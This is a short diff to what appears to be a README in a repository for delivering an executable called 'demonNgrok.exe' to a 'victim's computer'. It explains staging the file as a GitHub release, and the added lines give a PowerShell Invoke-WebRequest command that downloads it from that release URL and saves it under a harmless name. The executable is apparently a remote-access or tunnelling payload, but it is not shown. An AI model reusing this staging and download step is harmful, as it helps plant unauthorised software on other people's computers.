@@ -1,1 +1,5 @@
 To download demonNgrok.exe to victim's computer, create a release in this repository, add the executable file.
+
+PowerShell command to download the demonNgrok.exe
+
+Invoke-WebRequest -Uri "https://github.com/edwardhas/gusd-project/releases/download/demonNgrok/demonNgrok.exe" -OutFile "C:\Users\edwar\Downloads\test.exe"
